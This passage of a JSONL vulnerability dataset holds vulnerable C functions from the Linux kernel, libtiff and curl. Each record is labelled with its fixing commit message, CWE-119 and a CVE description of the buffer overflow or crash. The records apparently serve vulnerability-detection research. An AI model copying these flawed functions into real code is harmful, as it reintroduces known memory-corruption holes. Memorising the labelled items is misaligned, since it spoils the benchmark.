sizeof(hcf_16)));\n\t\t\t\t\twl_wep_decode(CRYPT_CODE, &sEncryption,\n\t\t\t\t\t\t\t\t    lp->szEncryption);\n\n\t\t\t\t\t/* the Linux driver likes to use 1-4 for the key IDs, and then\n\t\t\t\t\tconvert to 0-3 when sending to the card.  The Windows code\n\t\t\t\t\tbase used 0-3 in the API DLL, which was ported to Linux.  For\n\t\t\t\t\tthe sake of the user experience, we decided to keep 0-3 as the\n\t\t\t\t\tnumbers used in the DLL; and will perform the +1 conversion here.\n\t\t\t\t\tWe could have converted  the entire Linux driver, but this is\n\t\t\t\t\tless obtrusive.  This may be a \"todo\" to convert the whole driver */\n\t\t\t\t\tlp->TransmitKeyID    = sEncryption.wTxKeyID + 1;\n\t\t\t\t\tlp->EnableEncryption = sEncryption.wEnabled;\n\n\t\t\t\t\tmemcpy(&lp->DefaultKeys, &sEncryption.EncStr,\n\t\t\t\t\t\t\tsizeof(CFG_DEFAULT_KEYS_STRCT));\n\t\t\t\t\tbreak;\n\t\t\t\t/*case CFG_COUNTRY_STRING:\n\t\t\t\t\tmemset(lp->countryString, 0, sizeof(lp->countryString));\n\t\t\t\t\tmemcpy((void *)lp->countryString, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\t*/\n\n\t\t\t\tcase CFG_DRIVER_ENABLE:\n\t\t\t\t\tlp->driverEnable    = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]      = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_WOLAS_ENABLE:\n\t\t\t\t\tlp->wolasEnable = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_SET_WPA_AUTH_KEY_MGMT_SUITE:\n\t\t\t\t\tlp->AuthKeyMgmtSuite = pLtv->u.u16[0];\n\t\t\t\t\tpLtv->u.u16[0]  = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_DISASSOCIATE_ADDR:\n\t\t\t\t\tpLtv->u.u16[ETH_ALEN / 2] = CNV_INT_TO_LITTLE(pLtv->u.u16[ETH_ALEN / 2]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ADD_TKIP_DEFAULT_KEY:\n\t\t\t\tcase CFG_REMOVE_TKIP_DEFAULT_KEY:\n\t\t\t\t\t/* Endian convert the Tx Key Information */\n\t\t\t\t\tpLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_ADD_TKIP_MAPPED_KEY:\n\t\t\t\t\tbreak;\n\t\t\t\tcase CFG_REMOVE_TKIP_MAPPED_KEY:\n\t\t\t\t\tbreak;\n\t\t\t\t/* some RIDs just can't be put */\n\t\t\t\tcase CFG_MB_INFO:\n\t\t\t\tcase CFG_IFB:\n\t\t\t\tdefault:\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t/* This code will prevent Static Configuration Entities from\n\t\t\t\t   being sent to the card, as they require a call to\n\t\t\t\t   UIL_ACT_APPLY to take effect. Dynamic Entities will be sent\n\t\t\t\t   immediately */\n\t\t\t\tswitch (pLtv->typ) {\n\t\t\t\tcase CFG_CNF_PORT_TYPE:\n\t\t\t\tcase CFG_CNF_OWN_MAC_ADDR:\n\t\t\t\tcase CFG_CNF_OWN_CHANNEL:\n\t\t\t\tcase CFG_CNF_OWN_SSID:\n\t\t\t\tcase CFG_CNF_OWN_ATIM_WINDOW:\n\t\t\t\tcase CFG_CNF_SYSTEM_SCALE:\n\t\t\t\tcase CFG_CNF_MAX_DATA_LEN:\n\t\t\t\tcase CFG_CNF_PM_ENABLED:\n\t\t\t\tcase CFG_CNF_MCAST_RX:\n\t\t\t\tcase CFG_CNF_MAX_SLEEP_DURATION:\n\t\t\t\tcase CFG_CNF_HOLDOVER_DURATION:\n\t\t\t\tcase CFG_CNF_OWN_NAME:\n\t\t\t\tcase CFG_CNF_LOAD_BALANCING:\n\t\t\t\tcase CFG_CNF_MEDIUM_DISTRIBUTION:\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_TX_POW_LVL:\n\t\t\t\tcase CFG_CNF_CONNECTION_CNTL:\n\t\t\t\t/*case CFG_PROBE_DATA_RATE: */\n#endif /* HERMES25 */\n#if 1 /*;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/*;?should we restore this to allow smaller memory footprint */\n\t\t\t\tcase CFG_CNF_OWN_DTIM_PERIOD:\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_OWN_BEACON_INTERVAL:                    /* Own Beacon Interval */\n#endif /* WARP */\n#ifdef USE_WDS\n\t\t\t\tcase CFG_CNF_WDS_ADDR1:\n\t\t\t\tcase CFG_CNF_WDS_ADDR2:\n\t\t\t\tcase CFG_CNF_WDS_ADDR3:\n\t\t\t\tcase CFG_CNF_WDS_ADDR4:\n\t\t\t\tcase CFG_CNF_WDS_ADDR5:\n\t\t\t\tcase CFG_CNF_WDS_ADDR6:\n#endif\n\t\t\t\tcase CFG_CNF_MCAST_PM_BUF:\n\t\t\t\tcase CFG_CNF_REJECT_ANY:\n#endif\n\n\t\t\t\tcase CFG_CNF_ENCRYPTION:\n\t\t\t\tcase CFG_CNF_AUTHENTICATION:\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\tcase CFG_CNF_EXCL_UNENCRYPTED:\n\t\t\t\tcase CFG_CNF_MCAST_RATE:\n\t\t\t\tcase CFG_CNF_INTRA_BSS_RELAY:\n#endif\n\n\t\t\t\tcase CFG_CNF_MICRO_WAVE:\n\t\t\t\t/* case CFG_CNF_LOAD_BALANCING: */\n\t\t\t\t/* case CFG_CNF_MEDIUM_DISTRIBUTION: */\n\t\t\t\t/* case CFG_CNF_RX_ALL_GROUP_ADDRESS: */\n\t\t\t\t/* case CFG_CNF_COUNTRY_INFO: */\n\t\t\t\t/* case CFG_COUNTRY_STRING: */\n\t\t\t\tcase CFG_AP_MODE:\n\t\t\t\tcase CFG_ENCRYPT_STRING:\n\t\t\t\t/* case CFG_DRIVER_ENABLE: */\n\t\t\t\tcase CFG_WOLAS_ENABLE:\n\t\t\t\tcase CFG_MB_INFO:\n\t\t\t\tcase CFG_IFB:\n\t\t\t\t\tbreak;\n\t\t\t\t/* Deal with this dynamic MSF RID, as it's required for WPA */\n\t\t\t\tcase CFG_DRIVER_ENABLE:\n\t\t\t\t\tif (lp->driverEnable) {\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_ENABLE | HCF_PORT_0);\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_CONNECT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_DISABLE | HCF_PORT_0);\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_DISCONNECT);\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\twl_act_int_off(lp);\n\t\t\t\t\turq->result = hcf_put_info(&(lp->hcfCtx), (LTVP) pLtv);\n\t\t\t\t\twl_act_int_on(lp);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tif (ltvAllocated)\n\t\t\t\t\tkfree(pLtv);\n\t\t\t} else {\n\t\t\t\turq->result = UIL_FAILURE;\n\t\t\t}\n\t\t} else {\n\t\t\tDBG_ERROR(DbgInfo, \"EPERM\\n\");\n\t\t\turq->result = UIL_FAILURE;\n\t\t\tresult = -EPERM;\n\t\t}\n\t} else {\n\t\tDBG_ERROR(DbgInfo, \"UIL_ERR_WRONG_IFB\\n\");\n\t\turq->result = UIL_ERR_WRONG_IFB;\n\t}\n\n\tDBG_LEAVE(DbgInfo);\n\treturn result;\n} /* wvlan_uil_put_info */\n", "func_hash": 192300055996805061518087593122531999232, "file_name": "wl_priv.c", "file_hash": 140308459115906431610874421688851747022, "cwe": ["CWE-119"], "cve": "CVE-2013-4514", "cve_desc": "Multiple buffer overflows in drivers/staging/wlags49_h2/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4514"}
{"idx": 938, "project": "linux", "commit_id": "c2c65cd2e14ada6de44cb527e7f1990bede24e15", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c2c65cd2e14ada6de44cb527e7f1990bede24e15", "commit_message": "staging: ozwpan: prevent overflow in oz_cdev_write()\n\nWe need to check \"count\" so we don't overflow the ei->data buffer.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "static ssize_t oz_cdev_write(struct file *filp, const char __user *buf,\n\t\tsize_t count, loff_t *fpos)\n{\n\tstruct oz_pd *pd;\n\tstruct oz_elt_buf *eb;\n\tstruct oz_elt_info *ei;\n\tstruct oz_elt *elt;\n \tstruct oz_app_hdr *app_hdr;\n \tstruct oz_serial_ctx *ctx;\n \n \tspin_lock_bh(&g_cdev.lock);\n \tpd = g_cdev.active_pd;\n \tif (pd)\n\t\toz_pd_get(pd);\n\tspin_unlock_bh(&g_cdev.lock);\n\tif (pd == NULL)\n\t\treturn -ENXIO;\n\tif (!(pd->state & OZ_PD_S_CONNECTED))\n\t\treturn -EAGAIN;\n\teb = &pd->elt_buff;\n\tei = oz_elt_info_alloc(eb);\n\tif (ei == NULL) {\n\t\tcount = 0;\n\t\tgoto out;\n\t}\n\telt = (struct oz_elt *)ei->data;\n\tapp_hdr = (struct oz_app_hdr *)(elt+1);\n\telt->length = sizeof(struct oz_app_hdr) + count;\n\telt->type = OZ_ELT_APP_DATA;\n\tei->app_id = OZ_APPID_SERIAL;\n\tei->length = elt->length + sizeof(struct oz_elt);\n\tapp_hdr->app_id = OZ_APPID_SERIAL;\n\tif (copy_from_user(app_hdr+1, buf, count))\n\t\tgoto out;\n\tspin_lock_bh(&pd->app_lock[OZ_APPID_USB-1]);\n\tctx = (struct oz_serial_ctx *)pd->app_ctx[OZ_APPID_SERIAL-1];\n\tif (ctx) {\n\t\tapp_hdr->elt_seq_num = ctx->tx_seq_num++;\n\t\tif (ctx->tx_seq_num == 0)\n\t\t\tctx->tx_seq_num = 1;\n\t\tspin_lock(&eb->lock);\n\t\tif (oz_queue_elt_info(eb, 0, 0, ei) == 0)\n\t\t\tei = NULL;\n\t\tspin_unlock(&eb->lock);\n\t}\n\tspin_unlock_bh(&pd->app_lock[OZ_APPID_USB-1]);\nout:\n\tif (ei) {\n\t\tcount = 0;\n\t\tspin_lock_bh(&eb->lock);\n\t\toz_elt_info_free(eb, ei);\n\t\tspin_unlock_bh(&eb->lock);\n\t}\n\toz_pd_put(pd);\n\treturn count;\n}\n", "func_hash": 33191172042980294618689596958041133974, "file_name": "ozcdev.c", "file_hash": 132604815029829941913919591246238407625, "cwe": ["CWE-119"], "cve": "CVE-2013-4513", "cve_desc": "Buffer overflow in the oz_cdev_write function in drivers/staging/ozwpan/ozcdev.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted write operation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4513"}
{"idx": 979, "project": "libtiff", "commit_id": "ce6841d9e41d621ba23cf18b190ee6a23b2cc833", "project_url": "https://github.com/vadz/libtiff", "commit_url": "https://github.com/vadz/libtiff/commit/ce6841d9e41d621ba23cf18b190ee6a23b2cc833", "commit_message": "fix possible OOB write in gif2tiff.c", "target": 1, "func": "process(register int code, unsigned char** fill)\n{\n    int incode;\n    static unsigned char firstchar;\n\n    if (code == clear) {\n\tcodesize = datasize + 1;\n\tcodemask = (1 << codesize) - 1;\n\tavail = clear + 2;\n\toldcode = -1;\n\treturn 1;\n     }\n \n     if (oldcode == -1) {\n \t*(*fill)++ = suffix[code];\n \tfirstchar = oldcode = code;\n \treturn 1;\n    }\n    if (code > avail) {\n\tfprintf(stderr, \"code %d too large for %d\\n\", code, avail);\n\treturn 0; \n    }\n\n    incode = code;\n    if (code == avail) {      /* the first code is always < avail */\n\t*stackp++ = firstchar;\n\tcode = oldcode;\n    }\n    while (code > clear) {\n\t*stackp++ = suffix[code];\n\tcode = prefix[code];\n    }\n\n    *stackp++ = firstchar = suffix[code];\n    prefix[avail] = oldcode;\n    suffix[avail] = firstchar;\n    avail++;\n\n    if (((avail & codemask) == 0) && (avail < 4096)) {\n\tcodesize++;\n\tcodemask += avail;\n    }\n    oldcode = incode;\n    do {\n\t*(*fill)++ = *--stackp;\n    } while (stackp > stack);\n    return 1;\n}\n", "func_hash": 49639759056433865662554059812328933578, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-4244", "cve_desc": "The LZW decompressor in the gif2tiff tool in libtiff 4.0.3 and earlier allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) or possibly execute arbitrary code via a crafted GIF image.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4244"}
{"idx": 1014, "project": "linux", "commit_id": "cea4dcfdad926a27a18e188720efe0f2c9403456", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/cea4dcfdad926a27a18e188720efe0f2c9403456", "commit_message": "iscsi-target: fix heap buffer overflow on error\n\nIf a key was larger than 64 bytes, as checked by iscsi_check_key(), the\nerror response packet, generated by iscsi_add_notunderstood_response(),\nwould still attempt to copy the entire key into the packet, overflowing\nthe structure on the heap.\n\nRemote preauthentication kernel memory corruption was possible if a\ntarget was configured and listening on the network.\n\nCVE-2013-2850\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>", "target": 1, "func": "static int iscsi_add_notunderstood_response(\n\tchar *key,\n\tchar *value,\n\tstruct iscsi_param_list *param_list)\n{\n\tstruct iscsi_extra_response *extra_response;\n\n\tif (strlen(value) > VALUE_MAXLEN) {\n\t\tpr_err(\"Value for notunderstood key \\\"%s\\\" exceeds %d,\"\n\t\t\t\" protocol error.\\n\", key, VALUE_MAXLEN);\n\t\treturn -1;\n\t}\n\n\textra_response = kzalloc(sizeof(struct iscsi_extra_response), GFP_KERNEL);\n\tif (!extra_response) {\n\t\tpr_err(\"Unable to allocate memory for\"\n\t\t\t\" struct iscsi_extra_response.\\n\");\n\t\treturn -1;\n \t}\n \tINIT_LIST_HEAD(&extra_response->er_list);\n \n\tstrncpy(extra_response->key, key, strlen(key) + 1);\n\tstrncpy(extra_response->value, NOTUNDERSTOOD,\n\t\t\tstrlen(NOTUNDERSTOOD) + 1);\n \n \tlist_add_tail(&extra_response->er_list,\n \t\t\t&param_list->extra_response_list);\n\treturn 0;\n}\n", "func_hash": 100762060795839649631362584880083269766, "file_name": "iscsi_target_parameters.c", "file_hash": 259649241332208477666489010222901186765, "cwe": ["CWE-119"], "cve": "CVE-2013-2850", "cve_desc": "Heap-based buffer overflow in the iscsi_add_notunderstood_response function in drivers/target/iscsi/iscsi_target_parameters.c in the iSCSI target subsystem in the Linux kernel through 3.9.4 allows remote attackers to cause a denial of service (memory corruption and OOPS) or possibly execute arbitrary code via a long key that is not properly handled during construction of an error-response packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2850"}
{"idx": 1040, "project": "curl", "commit_id": "192c4f788d48f82c03e9cef40013f34370e90737", "project_url": "https://github.com/curl/curl", "commit_url": "https://github.com/bagder/curl/commit/192c4f788d48f82c03e9cef40013f34370e90737", "commit_message": "Curl_urldecode: no peeking beyond end of input buffer\n\nSecurity problem: CVE-2013-2174\n\nIf a program would give a string like \"%FF\" to curl_easy_unescape() but\nask for it to decode only the first byte, it would still parse and\ndecode the full hex sequence. The function then not only read beyond the\nallowed buffer but it would also deduct the *unsigned* counter variable\nfor how many more bytes there's left to read in the buffer by two,\nmaking the counter wrap. Continuing this, the function would go on\nreading beyond the buffer and soon writing beyond the allocated target\nbuffer...\n\nBug: http://curl.haxx.se/docs/adv_20130622.html\nReported-by: Timo Sirainen", "target": 1, "func": "CURLcode Curl_urldecode(struct SessionHandle *data,\n                        const char *string, size_t length,\n                        char **ostring, size_t *olen,\n                        bool reject_ctrl)\n{\n  size_t alloc = (length?length:strlen(string))+1;\n  char *ns = malloc(alloc);\n  unsigned char in;\n  size_t strindex=0;\n  unsigned long hex;\n  CURLcode res;\n\n  if(!ns)\n    return CURLE_OUT_OF_MEMORY;\n \n   while(--alloc > 0) {\n     in = *string;\n    if(('%' == in) && ISXDIGIT(string[1]) && ISXDIGIT(string[2])) {\n       /* this is two hexadecimal digits following a '%' */\n       char hexstr[3];\n       char *ptr;\n      hexstr[0] = string[1];\n      hexstr[1] = string[2];\n      hexstr[2] = 0;\n\n      hex = strtoul(hexstr, &ptr, 16);\n\n      in = curlx_ultouc(hex); /* this long is never bigger than 255 anyway */\n\n      res = Curl_convert_from_network(data, &in, 1);\n      if(res) {\n        /* Curl_convert_from_network calls failf if unsuccessful */\n        free(ns);\n        return res;\n      }\n\n      string+=2;\n      alloc-=2;\n    }\n    if(reject_ctrl && (in < 0x20)) {\n      free(ns);\n      return CURLE_URL_MALFORMAT;\n    }\n\n    ns[strindex++] = in;\n    string++;\n  }\n  ns[strindex]=0; /* terminate it */\n\n  if(olen)\n    /* store output size */\n    *olen = strindex;\n\n  if(ostring)\n    /* store output string */\n    *ostring = ns;\n\n  return CURLE_OK;\n}\n", "func_hash": 85709973777579247011240190240020563804, "file_name": "escape.c", "file_hash": 170290579417472248714355406167155549130, "cwe": ["CWE-119"], "cve": "CVE-2013-2174", "cve_desc": "Heap-based buffer overflow in the curl_easy_unescape function in lib/escape.c in cURL and libcurl 7.7 through 7.30.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted string ending in a \"%\" (percent) character.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2174"}
{"idx": 1043, "project": "linux", "commit_id": "baff42ab1494528907bf4d5870359e31711746ae", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/baff42ab1494528907bf4d5870359e31711746ae", "commit_message": "net: Fix oops from tcp_collapse() when using splice()\n\ntcp_read_sock() can have a eat skbs without immediately advancing copied_seq.\nThis can cause a panic in tcp_collapse() if it is called as a result\nof the recv_actor dropping the socket lock.\n\nA userspace program that splices data from a socket to either another\nsocket or to a file can trigger this bug.\n\nSigned-off-by: Steven J. Magnani <steve@digidescorp.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "int tcp_read_sock(struct sock *sk, read_descriptor_t *desc,\n\t\t  sk_read_actor_t recv_actor)\n{\n\tstruct sk_buff *skb;\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tu32 seq = tp->copied_seq;\n\tu32 offset;\n\tint copied = 0;\n\n\tif (sk->sk_state == TCP_LISTEN)\n\t\treturn -ENOTCONN;\n\twhile ((skb = tcp_recv_skb(sk, seq, &offset)) != NULL) {\n\t\tif (offset < skb->len) {\n\t\t\tint used;\n\t\t\tsize_t len;\n\n\t\t\tlen = skb->len - offset;\n\t\t\t/* Stop reading if we hit a patch of urgent data */\n\t\t\tif (tp->urg_data) {\n\t\t\t\tu32 urg_offset = tp->urg_seq - seq;\n\t\t\t\tif (urg_offset < len)\n\t\t\t\t\tlen = urg_offset;\n\t\t\t\tif (!len)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tused = recv_actor(desc, skb, offset, len);\n\t\t\tif (used < 0) {\n\t\t\t\tif (!copied)\n\t\t\t\t\tcopied = used;\n\t\t\t\tbreak;\n\t\t\t} else if (used <= len) {\n\t\t\t\tseq += used;\n\t\t\t\tcopied += used;\n\t\t\t\toffset += used;\n\t\t\t}\n\t\t\t/*\n\t\t\t * If recv_actor drops the lock (e.g. TCP splice\n\t\t\t * receive) the skb pointer might be invalid when\n\t\t\t * getting here: tcp_collapse might have deleted it\n\t\t\t * while aggregating skbs from the socket queue.\n\t\t\t */\n\t\t\tskb = tcp_recv_skb(sk, seq-1, &offset);\n\t\t\tif (!skb || (offset+1 != skb->len))\n\t\t\t\tbreak;\n\t\t}\n\t\tif (tcp_hdr(skb)->fin) {\n\t\t\tsk_eat_skb(sk, skb, 0);\n\t\t\t++seq;\n\t\t\tbreak;\n\t\t}\n \t\tsk_eat_skb(sk, skb, 0);\n \t\tif (!desc->count)\n \t\t\tbreak;\n \t}\n \ttp->copied_seq = seq;\n \n\ttcp_rcv_space_adjust(sk);\n\n\t/* Clean up data we have read: This will do ACK frames. */\n\tif (copied > 0)\n\t\ttcp_cleanup_rbuf(sk, copied);\n\treturn copied;\n}\n", "func_hash": 199403613559602624417210486913245263722, "file_name": "tcp.c", "file_hash": 12402514951805329113272490821094356586, "cwe": ["CWE-119"], "cve": "CVE-2013-2128", "cve_desc": "The tcp_read_sock function in net/ipv4/tcp.c in the Linux kernel before 2.6.34 does not properly manage skb consumption, which allows local users to cause a denial of service (system crash) via a crafted splice system call for a TCP socket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2128"}
{"idx": 1045, "project": "linux", "commit_id": "929473ea05db455ad88cdc081f2adc556b8dc48f", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/929473ea05db455ad88cdc081f2adc556b8dc48f", "commit_message": "usb: chipidea: Allow disabling streaming not only in udc mode\n\nWhen running a scp transfer using a USB/Ethernet adapter the following crash\nhappens:\n\n$ scp test.tar.gz fabio@192.168.1.100:/home/fabio\nfabio@192.168.1.100's password:\ntest.tar.gz                                      0%    0     0.0KB/s   --:-- ETA\n------------[ cut here ]------------\nWARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0()\nNETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out\nModules linked in:\nBacktrace:\n[<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c)\n r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0\n[<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>]\n(warn_slowpath_common+0x54/0x6c)\n[<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>]\n(warn_slowpath_fmt+0x38/0x40)\n...\n\nSetting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.\n\nHowever, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode,\nso allow disabling streaming also in host mode.\n\nTested on a mx6qsabrelite board.\n\nSuggested-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Fabio Estevam <fabio.estevam@freescale.com>\nReviewed-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 1, "func": "static int host_start(struct ci13xxx *ci)\n{\n\tstruct usb_hcd *hcd;\n\tstruct ehci_hcd *ehci;\n\tint ret;\n\n\tif (usb_disabled())\n\t\treturn -ENODEV;\n\n\thcd = usb_create_hcd(&ci_ehci_hc_driver, ci->dev, dev_name(ci->dev));\n\tif (!hcd)\n\t\treturn -ENOMEM;\n\n\tdev_set_drvdata(ci->dev, ci);\n\thcd->rsrc_start = ci->hw_bank.phys;\n\thcd->rsrc_len = ci->hw_bank.size;\n\thcd->regs = ci->hw_bank.abs;\n\thcd->has_tt = 1;\n\n\thcd->power_budget = ci->platdata->power_budget;\n\thcd->phy = ci->transceiver;\n\n\tehci = hcd_to_ehci(hcd);\n\tehci->caps = ci->hw_bank.cap;\n\tehci->has_hostpc = ci->hw_bank.lpm;\n\n\tret = usb_add_hcd(hcd, 0, 0);\n\tif (ret)\n\t\tusb_put_hcd(hcd);\n \telse\n \t\tci->hcd = hcd;\n \n \treturn ret;\n }\n", "func_hash": 178357202326078378305249559512498247150, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-2058", "cve_desc": "The host_start function in drivers/usb/chipidea/host.c in the Linux kernel before 3.7.4 does not properly support a certain non-streaming option, which allows local users to cause a denial of service (system crash) by sending a large amount of network traffic through a USB/Ethernet adapter.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2058"}
{"idx": 1056, "project": "linux", "commit_id": "715230a44310a8cf66fbfb5a46f9a62a9b2de424", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/715230a44310a8cf66fbfb5a46f9a62a9b2de424", "commit_message": "tg3: fix length overflow in VPD firmware parsing\n\nCommit 184b89044fb6e2a74611dafa69b1dce0d98612c6 (\"tg3: Use VPD fw version\nwhen present\") introduced VPD parsing that contained a potential length\noverflow.\n\nLimit the hardware's reported firmware string length (max 255 bytes) to\nstay inside the driver's firmware string length (32 bytes). On overflow,\ntruncate the formatted firmware string instead of potentially overwriting\nportions of the tg3 struct.\n\nhttp://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdf\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Oded Horovitz <oded@privatecore.com>\nReported-by: Brad Spengler <spender@grsecurity.net>\nCc: stable@vger.kernel.org\nCc: Matt Carlson <mcarlson@broadcom.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static void tg3_read_vpd(struct tg3 *tp)\n{\n\tu8 *vpd_data;\n\tunsigned int block_end, rosize, len;\n\tu32 vpdlen;\n\tint j, i = 0;\n\n\tvpd_data = (u8 *)tg3_vpd_readblock(tp, &vpdlen);\n\tif (!vpd_data)\n\t\tgoto out_no_vpd;\n\n\ti = pci_vpd_find_tag(vpd_data, 0, vpdlen, PCI_VPD_LRDT_RO_DATA);\n\tif (i < 0)\n\t\tgoto out_not_found;\n\n\trosize = pci_vpd_lrdt_size(&vpd_data[i]);\n\tblock_end = i + PCI_VPD_LRDT_TAG_SIZE + rosize;\n\ti += PCI_VPD_LRDT_TAG_SIZE;\n\n\tif (block_end > vpdlen)\n\t\tgoto out_not_found;\n\n\tj = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t      PCI_VPD_RO_KEYWORD_MFR_ID);\n\tif (j > 0) {\n\t\tlen = pci_vpd_info_field_size(&vpd_data[j]);\n\n\t\tj += PCI_VPD_INFO_FLD_HDR_SIZE;\n\t\tif (j + len > block_end || len != 4 ||\n\t\t    memcmp(&vpd_data[j], \"1028\", 4))\n\t\t\tgoto partno;\n\n\t\tj = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t\t      PCI_VPD_RO_KEYWORD_VENDOR0);\n\t\tif (j < 0)\n\t\t\tgoto partno;\n\n\t\tlen = pci_vpd_info_field_size(&vpd_data[j]);\n\n\t\tj += PCI_VPD_INFO_FLD_HDR_SIZE;\n \t\tif (j + len > block_end)\n \t\t\tgoto partno;\n \n\t\tmemcpy(tp->fw_ver, &vpd_data[j], len);\n\t\tstrncat(tp->fw_ver, \" bc \", vpdlen - len - 1);\n \t}\n \n partno:\n\ti = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t      PCI_VPD_RO_KEYWORD_PARTNO);\n\tif (i < 0)\n\t\tgoto out_not_found;\n\n\tlen = pci_vpd_info_field_size(&vpd_data[i]);\n\n\ti += PCI_VPD_INFO_FLD_HDR_SIZE;\n\tif (len > TG3_BPN_SIZE ||\n\t    (len + i) > vpdlen)\n\t\tgoto out_not_found;\n\n\tmemcpy(tp->board_part_number, &vpd_data[i], len);\n\nout_not_found:\n\tkfree(vpd_data);\n\tif (tp->board_part_number[0])\n\t\treturn;\n\nout_no_vpd:\n\tif (tg3_asic_rev(tp) == ASIC_REV_5717) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_5717 ||\n\t\t    tp->pdev->device == TG3PCI_DEVICE_TIGON3_5717_C)\n\t\t\tstrcpy(tp->board_part_number, \"BCM5717\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_5718)\n\t\t\tstrcpy(tp->board_part_number, \"BCM5718\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57780) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57780)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57780\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57760)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57760\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57790)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57790\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57788)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57788\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57765) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57761)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57761\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57765)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57765\");\n\t\telse if (tp->pdev->device == 